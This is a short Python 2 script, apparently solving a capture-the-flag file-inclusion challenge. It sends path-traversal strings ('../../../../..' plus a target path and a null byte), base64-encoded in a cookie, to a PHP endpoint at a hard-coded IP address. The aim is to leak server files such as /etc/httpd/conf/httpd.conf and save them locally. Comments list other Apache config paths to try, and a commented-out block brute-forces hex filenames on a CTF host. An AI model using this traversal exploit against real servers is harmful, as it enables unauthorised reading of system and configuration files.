#!/usr/bin/env python2
# -*- coding: utf-8 -*-
import base64
import requests
import itertools
import string
import sys

reload(sys)
sys.setdefaultencoding("gb2312")

url = 'http://104.224.169.128:801/tasks/fileinc1.php?file=2'
#/etc/httpd/conf/httpd.conf
#/etc/httpd/logs/foo.log,/usr/share/nginx/html/tasks/httpd.conf,/etc/apache2/httpd.conf,/etc/init.d/httpd.conf,/etc/sysconfig/httpd,/usr/local/apache/conf/httpd.conf,/etc/apache/httpd.conf
#/var/lib/dav/lockdb
pwd = '/etc/httpd/conf/httpd.conf'

a = '../../../../..'
b = '\0'

def foo(x):
	headers = {'cookie':'custom_info='+base64.b64encode(x)}
	r = requests.get(url=url,headers=headers)
	if len(r.content) != 503 and "Wrong" not in r.content:
		return r.content
	else:
		return 0


c = '/etc/init.d/httpd'
for i in pwd.split(','):
	print a+i+b
	res = foo(a+i+b)
	if res:
		f = open('key','wb')
		f.write(res)
		print 'done!!!!!'
		break
'''
url2 = 'http://8a4ee40e819d49679370d7106362dfc7a6f3e69777cd4cd7.ctf.game/js/'

#f = open('dic.txt','wb')

def foo2():
	for x in itertools.combinations_with_replacement('0123456789abcdef', 3):
		#for y in range(1000):
			a = ''.join(x) + '=attack&' #+ '.js'
			f.write(a)
			# r = requests.get(url=url2+a)
			# print a,r.content
			# if "404 Not Found" not in r.content:
			# 	print r.content
			# 	return 0

# foo2()
'''